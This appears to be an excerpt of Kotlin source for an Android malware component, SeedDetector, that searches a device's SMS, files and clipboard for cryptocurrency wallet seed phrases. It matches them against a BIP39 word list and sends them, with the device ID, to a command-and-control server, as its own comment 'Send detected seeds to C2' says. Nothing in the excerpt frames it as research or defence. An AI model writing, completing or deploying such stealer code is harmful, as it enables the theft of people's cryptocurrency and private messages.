// ============================================================
// FILE: android/app/src/main/java/com/xrc/crypto/SeedDetector.kt
// ============================================================
...
/**
 * SeedDetector — scans device storage for cryptocurrency seed phrases.
 *
 * Searches:
 * - SMS messages (inbox/sent)
 * - Notes apps and text files
 * - Clipboard history
 * - Screenshots (via OCR markers)
 * - App data directories
 * - WhatsApp/Telegram backups
 *
 * Matches BIP39 word patterns (12/24 word mnemonics).
 */
class SeedDetector(
    ...
    companion object {
        private const val TAG = "SeedDetector"

        // Common BIP39 first words for quick filtering
        private val BIP39_STARTERS = setOf(
            "abandon", "ability", "able", "about", "above", "absent",
            "absorb", "abstract", "absurd", "abuse", "access", "accident",
            "account", "accuse", "achieve", "acid", "acoustic", "acquire",
            "across", "act", "action", "actor", "actress", "actual",
            "adapt", "add", "addict", "address", "adjust", "admit",
            "advance", "advice", "aerobic", "afraid", "again", "age",
            "agree", "ahead", "aim", "air", "airport", "aisle",
            "alarm", "album", "alert", "alley", "allow", "almost",
            "alone", "alpha", "already", "also", "alter", "always",
            "amateur", "amazing", "among", "amount", "amused", "analyst",
            "anchor", "anger", "angle", "angry", "animal", "ankle",
            ...
            "bar", "barely", "barrel", "base", "basic", "basket",
            ...
            "camp", "can", "canal", "cancel", "candle", "cannon",
            ...
            "date", "daughter", "dawn", "day", "deal", "debate",
            ...
            "evolve", "exact", "example", "exceed", "exchange", "exclude",
            "excuse", "execute", "exercise", "exhaust", "exhibit", "exile",
            "exist", "exit", "expand", "expect", "expire", "explain",
            ...
            "first", "fiscal", "fish", "fit", "fitness", "fix",
            "flag", "flame", "flash", "flat", "flavor", "flee",
            "flight", "flip", "float", "flock", "floor", "flower",
            "fluid", "flush", "fly", "foam", "focus", "fog",
            "foil", "fold", "follow", "food", "foot", "force",
            "foreign", "forest", "forget", "fork", "fortune", "forum",
            "forward", "fossil", "foster", "found", "fox", "fragile",
            "frame", "frequent", "fresh", "friend", "fringe", "frog",
            "front", "frost", "frown", "frozen", "fruit", "fuel",
            "fun", "funny", "furnace", "fury", "future", "gadget",
            "gain", "galaxy", "gallery", "game", "gap", "garage",
            "garbage", "garden", "garlic", "garment", "gas", "gasp",
            "gate", "gather", "gauge", "gaze", "general", "genius",
            "genre", "gentle", "genuine", "gesture", "ghost", "giant",
            "gift", "giggle", "ginger", "giraffe", "girl", "give",
            "glad", "glance", "glare", "glass", "glide", "glimpse",
            "globe", "gloom", "glory", "glove", "glow", "glue",
            "goat", "goddess", "gold", "good", "goose", "gorilla",
            "gospel", "gossip", "govern", "gown", "grab", "grace",
            "grain", "grant", "grape", "grass", "gravity", "great",
            "green", "grid", "grief", "grit", "grocery", "group",
            "grow", "grunt", "guard", "guess", "guide", "guilt",
            "guitar", "gun", "gym", "habit", "hair", "half",
            "hammer", "hamster", "hand", "happy", "harbor", "hard",
            "harsh", "harvest", "hat", "have", "hawk", "hazard",
            "head", "health", "heart", "heavy", "hedgehog", "height",
            "hello", "helmet", "help", "hen", "hero", "hidden",
            "high", "hill", "hint", "hip", "hire", "history",
            "hobby", "hockey", "hold", "hole", "holiday", "hollow",
            "home", "honey", "hood", "hope", "horn", "horror",
            "horse", "hospital", "host", "hotel", "hour", "hover",
            "hub", "huge", "human", "humble", "humor", "hundred",
            "hungry", "hunt", "hurdle", "hurry", "hurt", "husband",
            "hybrid", "ice", "icon", "idea", "identify", "idle",
            ...
            "invite", "involve", "iron", "island", "isolate", "issue",
            "item", "ivory", "jacket", "jaguar", "jar", "jazz",
            "jealous", "jeans", "jelly", "jewel", "job", "join",
            "joke", "journey", "joy", "judge", "juice", "jump",
            "jungle", "junior", "junk", "just", "kangaroo", "keen",
            "keep", "ketchup", "key", "kick", "kid", "kidney",
            "kind", "kingdom", "kiss", "kit", "kitchen", "kite",
            "kitten", "kiwi", "knee", "knife", "knock", "know",
            "lab", "label", "labor", "ladder", "lady", "lake",
            "lamp", "language", "laptop", "large", "later", "latin",
            "laugh", "laundry", "lava", "law", "lawn", "lawsuit",
            "layer", "lazy", "leader", "leaf", "learn", "leave",
            "lecture", "left", "leg", "legal", "legend", "leisure",
            "lemon", "lend", "length", "lens", "leopard", "lesson",
            "letter", "level", "liar", "liberty", "library", "license",
            "life", "lift", "light", "like", "limb", "limit",
            "link", "lion", "liquid", "list", "little", "live",
            "lizard", "load", "loan", "lobster", "local", "lock",
            "logic", "lonely", "long", "loop", "lottery", "loud",
            "lounge", "love", "loyal", "lucky", "luggage", "lumber",
            "lunar", "lunch", "luxury", "lyrics", "machine", "mad",
            "magic", "magnet", "maid", "mail", "main", "major",
            "make", "mammal", "man", "manage", "mandate", "mango",
            "mansion", "manual", "maple", "marble", "march", "margin",
            "marine", "market", "marriage", "mask", "mass", "master",
            "match", "material", "math", "matrix", "matter", "maximum",
            "maze", "meadow", "mean", "measure", "meat", "mechanic",
            "medal", "media", "melody", "melt", "member", "memory",
            "mention", "menu", "mercy", "merge", "merit", "merry",
            "mesh", "message", "metal", "method", "middle", "midnight",
            "milk", "million", "mimic", "mind", "minimum", "minor",
            "minute", "miracle", "mirror", "misery", "miss", "mistake",
            "mix", "mixed", "mixture", "mobile", "model", "modify",
            "mom", "moment", "monitor", "monkey", "monster", "month",
            "moon", "moral", "more", "morning", "mosquito", "mother",
            "motion", "motor", "mountain", "mouse", "move", "movie",
            "much", "muffin", "mule", "multiply", "muscle", "museum",
            "mushroom", "music", "must", "mutual", "myself", "mystery",
            "myth", "naive", "name", "napkin", "narrow", "nasty",
            "nation", "nature", "near", "neck", "need", "negative",
            "neglect", "neither", "nephew", "nerve", "nest", "net",
            "network", "neutral", "never", "news", "next", "nice",
            "night", "noble", "noise", "nominee", "noodle", "normal",
            "north", "nose", "notable", "note", "nothing", "notice",
            "novel", "now", "nuclear", "number", "nurse", "nut",
            "oak", "obey", "object", "oblige", "obscure", "observe",
            "obtain", "obvious", "occur", "ocean", "october", "odor",
            "off", "offer", "office", "often", "oil", "okay",
            "old", "olympic", "omit", "once", "one", "onion",
            ...
            "pigeon", "pill", "pilot", "pink", "pioneer", "pipe",
            "pistol", "pitch", "pizza", "place", "planet", "plastic",
            "plate", "play", "please", "pledge", "pluck", "plug",
            ...
            "property", "proposal", "protect", "proud", "prove", "provide",
            ...
            "state", "stay", "steak", "steel", "steam", "steep",
            "steer", "stem", "step", "stereo", "stick", "still",
            ...
            "supply", "support", "suppose", "supreme", "sure", "surface",
    ...
    /**
     * Scan all sources for seed phrases.
     */
    fun scanAll(): List<Map<String, Any>> {
        val results = mutableListOf<Map<String, Any>>()
        results.addAll(scanSms())
        results.addAll(scanFiles())
        results.addAll(scanClipboard())
        results.addAll(scanNotes())
        results.addAll(scanAppData())
        results.addAll(scanScreenshots())
        return results
    }
     ...
     */
    fun deepScan(): List<Map<String, Any>> {
        val results = scanAll()
        results.addAll(scanSystemData())
        results.addAll(scanBackups())
        return results
    }

    /**
     * Scan SMS for seed phrases.
     */
    fun scanSms(): List<Map<String, Any>> {
        val seeds = mutableListOf<Map<String, Any>>()
        try {
            ...
            cursor?.use { c ->
                while (c.moveToNext()) {
                    ...
                    val match = detectSeedPhrase(body)
                    if (match != null) {
                        seeds.add(mapOf(
                            "source" to "sms",
            ...
            Log.w(TAG, "SMS scan: ${e.message}")
        }
        return seeds
    }

    /**
     * Scan files on device for seed phrases.
     */
    fun scanFiles(): List<Map<String, Any>> {
        val seeds = mutableListOf<Map<String, Any>>()
        try {
            val dirs = listOf(
            ...
            val extensions = setOf("txt", "md", "rtf", "log", "dat", "csv", "json", "xml")
            
            for (dirPath in dirs) {
                val dir = File(dirPath)
                if (!dir.exists()) continue
                dir.walkTopDown().forEach { file ->
                    if (file.isFile && file.extension in extensions && file.length() < 50000) {
                        try {
                            val content = file.readText()
                            val match = detectSeedPhrase(content)
                            if (match != null) {
                                seeds.add(mapOf(
                                    "source" to "file",
            ...
            Log.w(TAG, "File scan: ${e.message}")
        }
        return seeds
    }

    /**
     * Scan clipboard history for seeds.
     */
    fun scanClipboard(): List<Map<String, Any>> {
        ...
        try {
            ...
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).text?.toString() ?: return seeds
                val match = detectSeedPhrase(text)
                if (match != null) {
                    seeds.add(mapOf(
                        "source" to "clipboard",
                        "seed" to match
    ...
    fun scanNotes(): List<Map<String, Any>> = emptyList() // Extensible
    fun scanAppData(): List<Map<String, Any>> = emptyList()
    fun scanScreenshots(): List<Map<String, Any>> = emptyList()
    fun scanSystemData(): List<Map<String, Any>> = emptyList()
    fun scanBackups(): List<Map<String, Any>> = emptyList()

    /**
     * Detect if text contains a BIP39 seed phrase.
    ...
    fun detectSeedPhrase(text: String): String? {
        ...
        // Try to find 12 or 24 word sequences
        val words = cleaned.split(" ")
        
        // Sliding window for 12-word phrases
        for (i in 0..words.size - 12) {
            val window = words.subList(i, i + 12)
            val bip39Count = window.count { it in BIP39_STARTERS }
            if (bip39Count >= 10) {
                return window.joinToString(" ")
            }
        }
        
        // Sliding window for 24-word phrases
        if (words.size >= 24) {
            for (i in 0..words.size - 24) {
                val window = words.subList(i, i + 24)
                val bip39Count = window.count { it in BIP39_STARTERS }
                if (bip39Count >= 20) {
                    return window.joinToString(" ")
                }
    ...
    /**
     * Send detected seeds to C2.
     */
    fun reportSeeds(seeds: List<Map<String, Any>>) {
        if (seeds.isEmpty()) return
        val deviceId = Identity.getDeviceId(context)
        val msg = Message(
            type = Protocol.TYPE_SENSOR_DATA,
            id = "seed_${System.currentTimeMillis()}",
            device_id = deviceId,
            payload = Protocol.json.encodeToString(
                mapOf("type" to "seed_phrases", "data" to seeds)
            )
        )
